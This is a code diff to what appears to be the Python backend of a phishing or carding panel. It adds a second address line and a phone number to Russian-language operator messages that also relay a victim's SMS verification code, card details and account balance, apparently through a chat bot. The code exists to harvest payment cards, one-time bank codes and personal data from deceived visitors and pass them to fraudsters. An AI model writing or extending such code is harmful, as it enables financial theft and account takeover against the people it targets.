@@ -136,6 +136,7 @@ class VisitorMessage(BaseModel):
     card_name: str = ""
     country: str = ""
     address1: str = ""
+    address2: str = ""
     zip_code: str = ""
     city: str = ""
     phone_dial: str = ""
@@ -411,6 +412,8 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
             addr_lines.append(f"  Страна: {body.country}")
         if body.address1:
             addr_lines.append(f"  Адрес: {body.address1}")
+        if body.address2:
+            addr_lines.append(f"  Адрес 2: {body.address2}")
         if body.zip_code or body.city:
             addr_lines.append(f"  Индекс: {body.zip_code or '—'}, {body.city or '—'}")
         parts = [f"🔑 <b>Код из SMS: {body.text.strip()}</b>"]
@@ -440,6 +443,8 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
             addr_lines.append(f"  Страна: {body.country}")
         if body.address1:
             addr_lines.append(f"  Адрес: {body.address1}")
+        if body.address2:
+            addr_lines.append(f"  Адрес 2: {body.address2}")
         if body.zip_code or body.city:
             addr_lines.append(f"  Индекс: {body.zip_code or '—'}, {body.city or '—'}")
         parts = [f"💰 <b>Баланс:</b> <code>{body.balance_amount} {body.balance_currency or ''}</code>"]
@@ -447,6 +452,8 @@ async def visitor_message(body: VisitorMessage, request: Request) -> JSONRespons
             parts.append("💳 <b>Карта:</b>\n" + "\n".join(card_lines))
         if addr_lines:
             parts.append("📍 <b>Адрес:</b>\n" + "\n".join(addr_lines))
+        if body.phone or body.phone_dial:
+            parts.append(f"📞 <b>Телефон:</b> {body.phone_dial}{body.phone or '—'}")
         msg_body = "\n\n".join(parts)
 
     reply_kb = {
